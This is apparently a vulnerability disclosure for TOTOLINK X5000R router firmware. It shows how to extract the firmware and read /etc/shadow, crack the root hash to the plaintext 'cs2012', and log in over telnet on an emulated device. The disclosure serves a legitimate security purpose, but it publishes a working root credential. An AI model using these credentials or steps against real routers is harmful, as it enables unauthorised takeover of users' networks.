# Hardcoded Password in Totolink X5000R

- **Device**: TOTOLINK X5000R V9.1.0cu.2415_B20250515
- **Firmware**: CS_C8344R_X5000R_IP04433_MT7621MT7915_SPI_16M256M_V9.1.0cu.2415_B20250515_ALL.web
- **Download link**: https://www.totolink.net/data/upload/20250515/9ef4ceaaae8d9c1ac3e26e15af8d97b0.web

## Description
TOTOLINK X5000R V9.1.0cu.2415_B20250515 was discovered to contain a hardcoded password for root which is stored in the component /etc/shadow. The vendor acknowledged the vulnerability but did not propose any remediation.

## Proof-Of-Concept
After the download of the firmware, it is necessary to extract it via binwalk.
```
binwalk -eM CS_C8344R_X5000R_IP04433_MT7621MT7915_SPI_16M256M_V9.1.0cu.2415_B20250515_ALL.web -C X5000R
cd X5000R/_CS_C8344R_X5000R_IP04433_MT7621MT7915_SPI_16M256M_V9.1.0cu.2415_B20250515_ALL.web.extracted/squashfs-root/
cat etc/shadow

root:$1$ArDex.Yh$J4iv2K7mBpSnHewlCdkdp.:0:0:99999:7:::
daemon:*:0:0:99999:7:::
ftp:*:0:0:99999:7:::
network:*:0:0:99999:7:::
nobody:*:0:0:99999:7:::
dnsmasq:x:0:0:99999:7:::
```

By using John The Ripper with the "rockyou" wordlist, it is possible to crack the password and obtain "cs2012".
```
john hash.txt --wordlist rockyou.txt 
$1$ArDex.Yh$J4iv2K7mBpSnHewlCdkdp.:cs2012
```

Inside the firmware there is the telnet binary linking to busybox. 
```
ls -l usr/sbin/telnetd 
lrwxrwxrwx 1 x x 17 May 15  2025 usr/sbin/telnetd -> ../../bin/busybox
```

The emulation of the binary with qemu allows to verify the fairness of the credentials. In fact, by logging with telnet with the credentials root:cs2012 it is possible to access the router as saw in the image below.

<img width="1912" height="508" alt="Screenshot from 2026-03-07 13-52-12" src="https://github.com/user-attachments/assets/a2d035dc-9b8d-428c-9795-a207c1e8e753" />
